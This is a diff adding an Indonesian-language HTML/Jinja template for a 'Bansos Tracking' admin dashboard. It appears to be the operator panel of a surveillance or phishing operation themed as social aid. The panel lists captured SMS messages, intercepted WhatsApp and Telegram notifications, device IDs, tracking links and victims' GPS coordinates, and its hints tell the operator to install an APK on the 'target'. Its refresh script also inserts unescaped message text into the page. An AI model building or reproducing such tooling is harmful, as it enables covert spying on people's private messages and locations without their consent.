@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>✦ Dashboard — Bansos Tracking</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0a0e17;
+  --surface:#111827;
+  --surface2:#1a2236;
+  --surface3:#1e293b;
+  --border:#2a3a5c;
+  --text:#e2e8f0;
+  --text2:#94a3b8;
+  --text3:#64748b;
+  --blue:#3b82f6;
+  --cyan:#06b6d4;
+  --green:#10b981;
+  --amber:#f59e0b;
+  --purple:#8b5cf6;
+  --rose:#f43f5e;
+  --pink:#ec4899;
+  --wa:#25d366;
+  --tg:#0088cc;
+  --grad:linear-gradient(135deg,#0f172a,#1e293b);
+  --glow:0 0 40px rgba(59,130,246,0.1);
+}
+html{font-size:16px}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,sans-serif;
+  background:var(--bg);color:var(--text);min-height:100vh;
+  -webkit-font-smoothing:antialiased;
+}
+/* === HEADER === */
+.header{
+  position:sticky;top:0;z-index:50;
+  background:rgba(10,14,23,0.85);backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border);
+  padding:12px 16px;
+}
+.header-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;gap:12px}
+.header-icon{width:36px;height:36px;border-radius:10px;background:var(--grad);
+  display:flex;align-items:center;justify-content:center;font-size:18px;
+  box-shadow:0 0 20px rgba(59,130,246,0.2);flex-shrink:0}
+.header h1{font-size:16px;font-weight:700;letter-spacing:-0.3px;
+  background:linear-gradient(135deg,#60a5fa,#06b6d4);-webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;background-clip:text}
+.header-meta{margin-left:auto;font-size:11px;color:var(--text3);text-align:right}
+.header-badge{
+  display:inline-flex;align-items:center;gap:4px;
+  padding:2px 8px;border-radius:6px;font-size:10px;font-weight:600;
+  background:rgba(16,185,129,0.12);color:var(--green);border:1px solid rgba(16,185,129,0.2)
+}
+/* === MAIN === */
+.main{max-width:1200px;margin:0 auto;padding:12px 12px 80px}
+/* === STATS ROW === */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px}
+.stat-card{
+  background:var(--surface);border-radius:12px;padding:12px 10px;
+  border:1px solid var(--border);position:relative;overflow:hidden;
+  transition:transform 0.2s,box-shadow 0.2s;
+}
+.stat-card:active{transform:scale(0.97)}
+.stat-card .icon{font-size:16px;margin-bottom:4px}
+.stat-card .val{font-size:20px;font-weight:800;letter-spacing:-0.5px;line-height:1.2}
+.stat-card .lbl{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:0.3px;margin-top:2px}
+.stat-glow{position:absolute;top:-50%;right:-50%;width:100%;height:100%;
+  border-radius:50%;opacity:0.05;pointer-events:none}
+.stat-card:nth-child(1) .stat-glow{background:var(--blue);box-shadow:0 0 60px var(--blue)}
+.stat-card:nth-child(2) .stat-glow{background:var(--purple);box-shadow:0 0 60px var(--purple)}
+.stat-card:nth-child(3) .stat-glow{background:var(--amber);box-shadow:0 0 60px var(--amber)}
+.stat-card:nth-child(4) .stat-glow{background:var(--cyan);box-shadow:0 0 60px var(--cyan)}
+.val.blue{color:var(--blue)}.val.purple{color:var(--purple)}.val.amber{color:var(--amber)}.val.cyan{color:var(--cyan)}
+
+/* === SECTION === */
+.section{
+  background:var(--surface);border-radius:12px;margin-bottom:12px;
+  border:1px solid var(--border);overflow:hidden;
+}
+.section-header{
+  display:flex;align-items:center;gap:8px;padding:12px 14px;
+  border-bottom:1px solid var(--border);font-size:12px;font-weight:600;
+  background:var(--surface2);
+}
+.section-header .icon{font-size:14px}
+.section-header .count{
+  margin-left:auto;background:var(--surface3);padding:1px 8px;
+  border-radius:6px;font-size:10px;color:var(--text2);font-weight:700;
+  min-width:20px;text-align:center;
+}
+.section-body{padding:10px}
+
+/* === CARDS GRID (responsive) === */
+.card-grid{display:grid;grid-template-columns:1fr;gap:8px}
+@media(min-width:640px){.card-grid{grid-template-columns:repeat(2,1fr)}}
+@media(min-width:1024px){.card-grid{grid-template-columns:repeat(3,1fr)}}
+.card{
+  background:var(--surface3);border-radius:10px;padding:10px 12px;
+  border:1px solid var(--border);transition:all 0.2s;
+}
+.card:active{transform:scale(0.98)}
+.card .app-badge{
+  display:inline-flex;align-items:center;gap:4px;
+  padding:1px 7px;border-radius:4px;font-size:9px;font-weight:700;
+  text-transform:uppercase;letter-spacing:0.3px;margin-bottom:6px;
+}
+.app-badge.wa{background:rgba(37,211,102,0.12);color:var(--wa)}
+.app-badge.tg{background:rgba(0,136,204,0.12);color:var(--tg)}
+.app-badge.sms{background:rgba(139,92,246,0.12);color:var(--purple)}
+.app-badge.other{background:rgba(100,116,139,0.15);color:var(--text3)}
+.card .sender{
+  font-size:12px;font-weight:600;color:var(--text);
+  display:flex;align-items:center;gap:5px;margin-bottom:3px;
+}
+.card .msg{
+  font-size:13px;color:var(--text2);line-height:1.5;
+  overflow:hidden;display:-webkit-box;-webkit-line-clamp:3;
+  -webkit-box-orient:vertical;word-break:break-all;
+}
+.card .meta{
+  display:flex;justify-content:space-between;align-items:center;
+  margin-top:6px;font-size:10px;color:var(--text3);
+  padding-top:6px;border-top:1px solid rgba(255,255,255,0.04);
+}
+.card .meta .dot{width:4px;height:4px;border-radius:50%;display:inline-block;margin-right:4px}
+.card .meta .dot.green{background:var(--wa)}
+.card .meta .dot.blue{background:var(--tg)}
+.card .meta .dot.purple{background:var(--purple)}
+
+/* === TRACKING TABLE === */
+.track-table{width:100%;border-collapse:collapse;font-size:11px}
+.track-table th{padding:8px 10px;text-align:left;color:var(--text3);font-weight:600;
+  font-size:10px;text-transform:uppercase;letter-spacing:0.3px;border-bottom:1px solid var(--border)}
+.track-table td{padding:8px 10px;border-bottom:1px solid rgba(255,255,255,0.03);color:var(--text2)}
+.track-table tr:last-child td{border-bottom:none}
+.track-table .status{padding:2px 8px;border-radius:4px;font-size:9px;font-weight:700}
+.status.on{background:rgba(16,185,129,0.15);color:var(--green)}
+.status.off{background:rgba(239,68,68,0.15);color:var(--rose)}
+.track-table .link-id{font-family:'SF Mono','Fira Code',monospace;font-size:10px;color:var(--cyan)}
+
+/* === EVENT LIST === */
+.event-list{display:flex;flex-direction:column;gap:4px}
+.event-item{
+  display:flex;gap:8px;align-items:flex-start;
+  padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03);font-size:11px;
+}
+.event-item:last-child{border-bottom:none}
+.event-icon{flex-shrink:0;width:24px;height:24px;border-radius:6px;
+  display:flex;align-items:center;justify-content:center;font-size:12px}
+.event-icon.loc{background:rgba(59,130,246,0.12);color:var(--blue)}
+.event-icon.cam{background:rgba(239,68,68,0.12);color:var(--rose)}
+.event-content{flex:1;min-width:0}
+.event-coords{font-family:'SF Mono','Fira Code',monospace;font-size:10px;color:var(--cyan);word-break:break-all}
+.event-time{font-size:10px;color:var(--text3);margin-top:2px}
+.event-acc{font-size:9px;color:var(--text3);display:inline-block;margin-top:2px}
+
+/* === EMPTY STATE === */
+.empty-state{text-align:center;padding:24px 12px;color:var(--text3)}
+.empty-state .emoji{font-size:36px;margin-bottom:8px}
+.empty-state .title{font-size:13px;font-weight:600;color:var(--text2);margin-bottom:4px}
+.empty-state .sub{font-size:11px}
+
+/* === BOTTOM NAV === */
+.bottom-nav{
+  position:fixed;bottom:0;left:0;right:0;z-index:50;
+  background:rgba(10,14,23,0.92);backdrop-filter:blur(20px);
+  border-top:1px solid var(--border);display:flex;
+}
+.bottom-nav a{
+  flex:1;display:flex;flex-direction:column;align-items:center;
+  padding:8px 4px 10px;text-decoration:none;color:var(--text3);
+  font-size:9px;font-weight:600;transition:color 0.2s;gap:2px;
+  -webkit-tap-highlight-color:transparent;
+}
+.bottom-nav a.active{color:var(--blue)}
+.bottom-nav a .nav-icon{font-size:18px;line-height:1}
+
+/* === SCROLLBAR === */
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
+
+/* === ANIMATIONS === */
+@keyframes pulse{
+  0%,100%{opacity:1}
+  50%{opacity:0.5}
+}
+.pulse{animation:pulse 2s ease-in-out infinite}
+
+/* === LOADING DOTS === */
+.loading{text-align:center;padding:24px;color:var(--text3)}
+.loading span{display:inline-block;width:6px;height:6px;border-radius:50%;
+  background:var(--blue);margin:0 3px;animation:pulse 1.4s ease-in-out infinite}
+.loading span:nth-child(2){animation-delay:0.2s}
+.loading span:nth-child(3){animation-delay:0.4s}
+
+/* === BADGE ANIMATION === */
+.badge-new{
+  display:inline-block;width:6px;height:6px;border-radius:50%;
+  background:var(--rose);margin-left:4px;animation:pulse 1s infinite
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="header">
+  <div class="header-inner">
+    <div class="header-icon">✦</div>
+    <h1>Bansos Dashboard</h1>
+    <div class="header-meta">
+      <span class="header-badge">● LIVE</span>
+      <div style="margin-top:2px">{{ base_url.replace('https://','') }}</div>
+    </div>
+  </div>
+</header>
+
+<!-- MAIN CONTENT -->
+<div class="main">
+
+  <!-- STATS -->
+  <div class="stats" id="statsContainer">
+    <div class="stat-card">
+      <div class="stat-glow"></div>
+      <div class="icon">🔗</div>
+      <div class="val blue">{{ total_links }}</div>
+      <div class="lbl">Link Aktif</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-glow"></div>
+      <div class="icon">📍</div>
+      <div class="val purple">{{ total_events }}</div>
+      <div class="lbl">Lokasi</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-glow"></div>
+      <div class="icon">💬</div>
+      <div class="val amber">{{ total_sms }}</div>
+      <div class="lbl">SMS</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-glow"></div>
+      <div class="icon">👁</div>
+      <div class="val cyan">{{ total_notif }}</div>
+      <div class="lbl">Chat</div>
+    </div>
+  </div>
+
+  <!-- PESAN CHAT (WhatsApp, Telegram, dll) -->
+  <div class="section">
+    <div class="section-header">
+      <span class="icon">💬</span> Pesan Chat
+      <span class="count">{{ total_notif }}</span>
+    </div>
+    <div class="section-body">
+      {% if notifs %}
+      <div class="card-grid" id="notifGrid">
+        {% for n in notifs %}
+        <div class="card">
+          <div class="app-badge {% if n[4]=='WhatsApp' %}wa{% elif n[4]=='Telegram' %}tg{% else %}other{% endif %}">
+            {{ n[4] or 'APP' }}
+          </div>
+          <div class="sender">
+            <span>👤</span> {{ n[0] or 'Unknown' }}
+          </div>
+          <div class="msg">{{ n[1] }}</div>
+          <div class="meta">
+            <span>
+              <span class="dot {% if n[4]=='WhatsApp' %}green{% elif n[4]=='Telegram' %}blue{% else %}purple{% endif %}"></span>
+              {{ n[2][:16] }}
+            </span>
+            <span>📱 {{ n[3][:6] if n[3] else '-' }}..</span>
+          </div>
+        </div>
+        {% endfor %}
+      </div>
+      {% else %}
+      <div class="empty-state">
+        <div class="emoji">🔇</div>
+        <div class="title">Belum Ada Pesan Chat</div>
+        <div class="sub">Aktifkan Akses Notifikasi di Settings target</div>
+      </div>
+      {% endif %}
+    </div>
+  </div>
+
+  <!-- SMS LOG -->
+  <div class="section">
+    <div class="section-header">
+      <span class="icon">📨</span> SMS Tertangkap
+      <span class="count">{{ total_sms }}</span>
+    </div>
+    <div class="section-body">
+      {% if sms %}
+      <div class="card-grid" id="smsGrid">
+        {% for s in sms %}
+        <div class="card">
+          <div class="app-badge sms">SMS</div>
+          <div class="sender">📨 {{ s[0] or 'Unknown' }}</div>
+          <div class="msg">{{ s[1] }}</div>
+          <div class="meta">
+            <span>{{ s[2][:16] }}</span>
+            <span>📱 {{ s[3][:6] if s[3] else '-' }}..</span>
+          </div>
+        </div>
+        {% endfor %}
+      </div>
+      {% else %}
+      <div class="empty-state">
+        <div class="emoji">📭</div>
+        <div class="title">Belum Ada SMS</div>
+        <div class="sub">Install APK di target untuk mulai menangkap SMS</div>
+      </div>
+      {% endif %}
+    </div>
+  </div>
+
+  <!-- TRACKING LINKS -->
+  <div class="section">
+    <div class="section-header">
+      <span class="icon">🔗</span> Tracking Links
+      <span class="count">{{ total_links }}</span>
+    </div>
+    <div class="section-body" style="padding:0;overflow-x:auto">
+      {% if links %}
+      <table class="track-table">
+        <thead><tr>
+          <th>Link ID</th>
+          <th>Nama</th>
+          <th>Events</th>
+          <th>Status</th>
+        </tr></thead>
+        <tbody>
+        {% for l in links %}
+        <tr>
+          <td><span class="link-id">{{ l[0] }}</span></td>
+          <td>{{ l[1][:20] }}</td>
+          <td>{{ l[4] }}</td>
+          <td><span class="status {% if l[3]==1 %}on{% else %}off{% endif %}">
+            {% if l[3]==1 %}AKTIF{% else %}NONAKTIF{% endif %}
+          </span></td>
+        </tr>
+        {% endfor %}
+        </tbody>
+      </table>
+      {% else %}
+      <div class="empty-state" style="padding:20px">
+        <div class="emoji">🔗</div>
+        <div class="title">Belum Ada Link</div>
+      </div>
+      {% endif %}
+    </div>
+  </div>
+
+  <!-- EVENTS -->
+  <div class="section">
+    <div class="section-header">
+      <span class="icon">📍</span> Event Lokasi
+      <span class="count">{{ total_events }}</span>
+    </div>
+    <div class="section-body">
+      {% if events %}
+      <div class="event-list" id="eventList">
+        {% for e in events %}
+        <div class="event-item">
+          <div class="event-icon loc">📍</div>
+          <div class="event-content">
+            <div class="event-coords">{{ e[1] }}, {{ e[2] }}</div>
+            <div class="event-time">Link: {{ e[0] }} · Akurasi: {{ e[3] }}m</div>
+          </div>
+        </div>
+        {% endfor %}
+      </div>
+      {% else %}
+      <div class="empty-state">
+        <div class="emoji">🗺</div>
+        <div class="title">Belum Ada Event</div>
+      </div>
+      {% endif %}
+    </div>
+  </div>
+
+</div>
+
+<!-- BOTTOM NAV -->
+<nav class="bottom-nav">
+  <a href="{{ base_url }}/admin/dashboard" class="active">
+    <span class="nav-icon">📊</span> Dashboard
+  </a>
+  <a href="{{ base_url }}/">
+    <span class="nav-icon">🏠</span> Landing
+  </a>
+  <a href="https://t.me/openflaredevbot">
+    <span class="nav-icon">🤖</span> Bot
+  </a>
+  <a onclick="location.reload()" style="cursor:pointer">
+    <span class="nav-icon">🔄</span> Refresh
+  </a>
+</nav>
+
+<script>
+// Auto-refresh every 10s
+setInterval(function(){
+  fetch('/admin/dashboard/json')
+    .then(r=>r.json())
+    .then(d=>{
+      // Update stats
+      if(document.getElementById('statsContainer')){
+        const cards = document.getElementById('statsContainer').querySelectorAll('.val');
+        if(cards.length>=4){
+          cards[0].textContent=d.total_links;
+          cards[1].textContent=d.total_events;
+          cards[2].textContent=d.total_sms;
+          cards[3].textContent=d.total_notif;
+        }
+      }
+      // Update notif grid
+      const ngrid=document.getElementById('notifGrid');
+      if(ngrid && d.notifs && d.notifs.length){
+        let html='';
+        d.notifs.forEach(n=>{
+          const app=n.app||'App';
+          const badgeCls=app==='WhatsApp'?'wa':app==='Telegram'?'tg':'other';
+          const dotCls=app==='WhatsApp'?'green':app==='Telegram'?'blue':'purple';
+          html+=`<div class="card">
+            <div class="app-badge ${badgeCls}">${app}</div>
+            <div class="sender"><span>👤</span> ${n.sender||'Unknown'}</div>
+            <div class="msg">${n.message||''}</div>
+            <div class="meta">
+              <span><span class="dot ${dotCls}"></span>${(n.timestamp||'').slice(0,16)}</span>
+              <span>📱 ${(n.device_id||'').slice(0,6)}..</span>
+            </div>
+          </div>`;
+        });
+        ngrid.innerHTML=html;
+      }
+      // Update SMS grid
+      const sgrid=document.getElementById('smsGrid');
+      if(sgrid && d.sms && d.sms.length){
+        let html='';
+        d.sms.forEach(s=>{
+          html+=`<div class="card">
+            <div class="app-badge sms">SMS</div>
+            <div class="sender">📨 ${s.sender||'Unknown'}</div>
+            <div class="msg">${s.message||''}</div>
+            <div class="meta">
+              <span>${(s.timestamp||'').slice(0,16)}</span>
+              <span>📱 ${(s.device_id||'').slice(0,6)}..</span>
+            </div>
+          </div>`;
+        });
+        sgrid.innerHTML=html;
+      }
+      // Update section counts
+      document.querySelectorAll('.section-header .count').forEach(el=>{
+        if(d.total_notif!==undefined && el.closest('.section') && el.closest('.section').querySelector('.icon')?.textContent==='💬')
+          el.textContent=d.total_notif;
+      });
+    })
+    .catch(()=>{});
+}, 12000);
+</script>
+</body>
+</html>
